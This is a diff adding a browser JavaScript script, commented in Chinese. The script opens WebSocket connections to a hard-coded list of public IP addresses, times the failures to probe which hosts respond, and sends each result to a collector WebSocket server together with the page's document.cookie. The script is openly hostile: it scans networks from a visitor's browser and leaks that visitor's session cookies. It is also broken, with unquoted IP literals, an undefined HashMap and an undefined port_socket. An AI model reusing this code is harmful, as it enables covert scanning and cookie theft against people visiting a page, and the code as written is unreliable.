@@ -1,0 +1,42 @@
+var server = 'ws://127.0.0.1:5555/'
+var result = new WebSocket(server)
+console.log("?")
+var ip_scan = [106.39.41.16,118.212.233.223,182.61.200.7,180.149.134.141,202.119.32.7,58.205.196.18,154.8.131.171,101.4.60.182,106.11.209.3,61.151.166.166,203.76.217.2]
+var hashMap = new HashMap()
+for(var key in ip_scan) {
+        let ip = 'ws://' + ip_scan[key] + '/'
+        let timeStampStart = new Date().getTime()
+        hashMap.put(ip, timeStampStart)
+
+        //1. 创建对IP发送的websocket
+        let ip_socket = new WebSocket(ip)
+
+        //2. 监听error事件
+        ip_socket.addEventListener('error', function (e) {
+            // 收到报错
+            let timeStampEnd = new Date().getTime()
+            let ip_time = timeStampEnd - hashMap.get(e.srcElement.url)
+             let msg =
+                {
+                host: document.cookie,
+                ip: e.srcElement.url,
+                //port: e.srcElement.url.substring(5,e.srcElement.url.length-1),
+                ping: ip_time
+                }
+                let msgJSON = JSON.stringify(msg)
+
+                result.send(msgJSON)
+                hashMap.remove(e.srcElement.url)            // 清理空间
+                port_socket.close()
+         })
+         ip_socket.close()
+}
+
+
+
+window.addEventListener("beforeunload",function() {
+    // 想加个监听事件避免websocket服务器进程在页面强行关闭处的异常
+    // 但是好像解决不了= =
+    // 不过问题不大，服务器端让他持续运行就好了
+    result.close()
+})
